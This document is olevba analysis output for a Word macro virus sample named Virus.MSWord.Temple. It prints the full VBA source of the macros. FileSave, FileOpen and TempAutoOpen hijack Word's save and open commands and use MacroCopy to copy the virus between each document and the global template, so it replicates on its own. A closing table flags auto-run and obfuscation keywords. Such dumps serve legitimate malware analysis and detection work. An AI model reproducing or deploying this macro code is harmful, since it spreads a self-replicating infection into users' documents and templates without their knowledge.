olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

    On Error GoTo -1: On Error GoTo ErrorHandler

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileSave.MAIN"

    On Error GoTo -1: On Error GoTo ErrorHandler

    WordBasic.FileSave
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
    WordBasic.MacroCopy "Global:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.FileSaveAs Format:=1

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileOpen.MAIN"

    On Error GoTo -1: On Error GoTo ErrorHandler

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
    WordBasic.MacroCopy "Global:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.FileSaveAs Format:=1

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:


End Sub
-------------------------------------------------------------------------------
VBA MACRO TempAutoOpen.bas 
in file: Virus.MSWord.Temple-c18251677f967997cb872e564c0be391176756b7 - OLE stream: 'Macros/VBA/TempAutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

    On Error GoTo -1: On Error GoTo ErrorHandler

    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Global:AutoExec"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Global:FileSave"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Global:FileOpen"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:TempAutoOpen"

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

